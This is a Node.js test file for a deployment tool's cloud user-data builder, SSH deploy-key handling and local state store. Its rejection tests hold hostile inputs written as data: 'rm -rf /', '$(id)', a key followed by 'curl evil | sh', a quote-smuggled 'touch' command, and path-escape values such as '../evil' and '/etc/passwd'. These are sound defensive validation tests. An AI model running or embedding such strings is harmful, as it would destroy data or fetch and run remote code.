import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "fs";
import fsp from "fs/promises";
import os from "os";
import path from "path";
import { execFileSync } from "child_process";

import { buildUserData, parseConsoleOutput, sitePath } from "../../cli/dist/lib/cloud/userData.js";
import { createKeyDir, generateDeployKey, hostKeyFingerprint, wipeDir } from "../../cli/dist/lib/cloud/keys.js";
import { createStore } from "../../cli/dist/lib/cloud/store.js";
import { FAKE_CREDENTIALS, HOST_KEY, PUBLIC_KEY } from "./helpers/cloudHarness.js";

const base = { project: "portfolio", deploymentId: "sf-0000abcd", publicKey: PUBLIC_KEY };

test("user-data: nginx on port 80 serving the project's current symlink, key-only unprivileged deploy user", () => {
  const script = buildUserData(base);

  assert.match(script, /^#!\/bin\/bash/);
  assert.match(script, /set -euo pipefail/);
  assert.match(script, /dnf install -y nginx tar/);
  assert.match(script, /useradd --create-home --shell \/bin\/bash "\$DEPLOY_USER"/);
  assert.match(script, /DEPLOY_USER="shipflow-deploy"/);
  assert.match(script, /root \/srv\/shipflow\/portfolio\/current;/);
  assert.match(script, /install -d -m 755 -o "\$DEPLOY_USER" -g "\$DEPLOY_USER" "\/srv\/shipflow\/portfolio"/);
  assert.match(script, /PermitRootLogin no/);
  assert.match(script, /PasswordAuthentication no/);
  assert.match(script, /nginx -t/);
  assert.equal(sitePath("portfolio"), "/srv/shipflow/portfolio");

  // The PUBLIC key is the only key material; no sudo for the deploy user.
  assert.ok(script.includes(PUBLIC_KEY));
  assert.doesNotMatch(script, /PRIVATE KEY/);
  assert.doesNotMatch(script, /sudoers|wheel|NOPASSWD|usermod -aG|chpasswd/);
  assert.doesNotMatch(script, new RegExp(Object.values(FAKE_CREDENTIALS).join("|").replace(/[/+]/g, ".")));
});

test("user-data refuses unsafe interpolation", () => {
  for (const project of ["x; rm -rf /", "$(id)", "a b", "../etc", "", "UPPER"]) {
    assert.throws(() => buildUserData({ ...base, project }), /Invalid project/, project);
  }
  for (const deploymentId of ["sf-1", "sf-ZZZZZZZZ", "x; id", "sf-0000abcd; id"]) {
    assert.throws(() => buildUserData({ ...base, deploymentId }), /Invalid deployment/, deploymentId);
  }
  for (const publicKey of [
    `${PUBLIC_KEY}\ncurl evil | sh`,
    "ssh-rsa AAAA",
    "-----BEGIN OPENSSH PRIVATE KEY-----\nabc\n-----END OPENSSH PRIVATE KEY-----",
    `${PUBLIC_KEY.split(" ")[0]} ${PUBLIC_KEY.split(" ")[1]} comment'; touch /tmp/x #`,
  ]) {
    assert.throws(() => buildUserData({ ...base, publicKey }), /public key|private key/i);
  }
});

test("console parsing: base64 or plain, only this deployment's completion marker", () => {
  const text = `boot\nSHIPFLOW-HOSTKEY-BEGIN\n${HOST_KEY}\nSHIPFLOW-HOSTKEY-END\nSHIPFLOW-BOOTSTRAP-COMPLETE sf-0000abcd\n`;

  for (const output of [text, Buffer.from(text).toString("base64"), text.replace(/\n/g, "\r\n")]) {
    assert.deepEqual(parseConsoleOutput(output, "sf-0000abcd"), { complete: true, hostKey: HOST_KEY });
  }

  assert.equal(parseConsoleOutput(text, "sf-ffff0000").complete, false, "another deployment's marker");
  assert.deepEqual(parseConsoleOutput("still booting", "sf-0000abcd"), { complete: false, hostKey: null });
  assert.equal(parseConsoleOutput(undefined, "sf-0000abcd").hostKey, null);
  assert.equal(parseConsoleOutput("SHIPFLOW-HOSTKEY-BEGIN\nssh-rsa AAAA\nSHIPFLOW-HOSTKEY-END", "x").hostKey, null);
});

const hasKeygen = (() => {
  try {
    execFileSync("ssh-keygen", ["-?"], { stdio: "ignore" });
    return true;
  } catch (error) {
    return error.code !== "ENOENT";
  }
})();

test("deploy key: real ssh-keygen output in a private directory, then wiped", { skip: !hasKeygen && "ssh-keygen not installed" }, async () => {
  const dir = await createKeyDir();
  const { privateKeyPath, publicKey } = await generateDeployKey({ dir, comment: "shipflow-sf-0000abcd" });

  assert.equal(fs.statSync(dir).mode & 0o777, 0o700, "directory is private");
  assert.equal(fs.statSync(privateKeyPath).mode & 0o777, 0o600, "private key is owner-only");
  assert.match(publicKey, /^ssh-ed25519 [A-Za-z0-9+/]{68} shipflow-sf-0000abcd$/);
  assert.match(fs.readFileSync(privateKeyPath, "utf8"), /^-----BEGIN OPENSSH PRIVATE KEY-----/);
  assert.doesNotThrow(() => buildUserData({ ...base, publicKey }), "the generated key passes user-data validation");

  // Our fingerprint matches OpenSSH's own.
  const reported = execFileSync("ssh-keygen", ["-lf", `${privateKeyPath}.pub`], { encoding: "utf8" });
  assert.ok(reported.includes(hostKeyFingerprint(publicKey)), reported);

  assert.equal(await wipeDir(dir), true);
  assert.equal(fs.existsSync(dir), false);
});

test("deploy key generation failures are explained", async () => {
  const dir = await createKeyDir();
  await assert.rejects(
    generateDeployKey({ dir, comment: "x", run: async () => { throw Object.assign(new Error("nope"), { code: "ENOENT" }); } }),
    /ssh-keygen was not found/
  );
  await wipeDir(dir);
});

test("wipeDir overwrites then removes, and tolerates a missing directory", async () => {
  const dir = await createKeyDir();
  const file = path.join(dir, "secret");
  await fsp.writeFile(file, "TOP-SECRET-KEY-MATERIAL");

  // Capture what is on disk right before removal by watching the overwrite.
  let overwritten = null;
  const original = fsp.rm;
  fsp.rm = async (target, options) => {
    overwritten = fs.readFileSync(file, "utf8");
    return original(target, options);
  };

  try {
    assert.equal(await wipeDir(dir), true);
  } finally {
    fsp.rm = original;
  }

  assert.equal(overwritten, "\0".repeat("TOP-SECRET-KEY-MATERIAL".length));
  assert.equal(await wipeDir(path.join(dir, "gone")), true);
});

// ------------------------------------------------------------------ store

async function newStore() {
  const root = await fsp.mkdtemp(path.join(os.tmpdir(), "sf-store-"));
  return { store: createStore({ dir: path.join(root, "cloud") }), root };
}

test("store: private directory and files, atomic writes, merge semantics", async () => {
  const { store } = await newStore();

  store.save("sf-0000abcd", { state: "provisioning", region: "ap-south-1", project: "p" });
  store.save("sf-0000abcd", { instanceId: "i-123", state: "running" });

  const file = path.join(store.dir, "sf-0000abcd.json");
  assert.equal(fs.statSync(store.dir).mode & 0o777, 0o700);
  assert.equal(fs.statSync(file).mode & 0o777, 0o600);
  assert.deepEqual(fs.readdirSync(store.dir), ["sf-0000abcd.json"], "no temp files left behind");

  const loaded = store.load("sf-0000abcd");
  assert.equal(loaded.region, "ap-south-1");
  assert.equal(loaded.instanceId, "i-123");
  assert.equal(loaded.state, "running");
  assert.equal(store.load("sf-ffffffff"), null);
});

test("store: only whitelisted fields are kept; credential-looking data is refused", async () => {
  const { store } = await newStore();

  store.save("sf-0000abcd", {
    state: "running",
    secretAccessKey: FAKE_CREDENTIALS.secretAccessKey,
    privateKey: "-----BEGIN OPENSSH PRIVATE KEY-----",
    sessionToken: FAKE_CREDENTIALS.sessionToken,
  });

  const text = fs.readFileSync(path.join(store.dir, "sf-0000abcd.json"), "utf8");
  assert.doesNotMatch(text, /secretAccessKey|privateKey|sessionToken|FakeSecret|FQoGZXIv/);

  assert.throws(() => store.save("sf-0000abcd", { url: `http://x/?k=${FAKE_CREDENTIALS.accessKeyId}` }), /credential/);
  assert.throws(() => store.save("sf-0000abcd", { project: "-----BEGIN OPENSSH PRIVATE KEY-----" }), /credential/);
});

test("store: deployment IDs cannot escape the directory", async () => {
  const { store, root } = await newStore();

  for (const id of ["../evil", "sf-../x", "/etc/passwd", "sf-1", "sf-ZZZZZZZZ", ""]) {
    assert.throws(() => store.save(id, { state: "x" }), /Invalid deployment ID/, id);
    assert.throws(() => store.load(id), /Invalid deployment ID/, id);
  }

  assert.deepEqual(fs.readdirSync(root).filter((n) => n !== "cloud"), []);
});

test("store: list is newest first and ignores unrelated or broken files", async () => {
  const { store } = await newStore();

  store.save("sf-00000001", { createdAt: "2026-01-01T00:00:00Z", state: "deployed" });
  store.save("sf-00000002", { createdAt: "2026-02-01T00:00:00Z", state: "running" });
  fs.writeFileSync(path.join(store.dir, "sf-00000003.json"), "{ not json");
  fs.writeFileSync(path.join(store.dir, "notes.txt"), "hi");

  assert.deepEqual(store.list().map((d) => d.id), ["sf-00000002", "sf-00000001"]);
  assert.deepEqual(createStore({ dir: path.join(store.dir, "missing") }).list(), []);
});
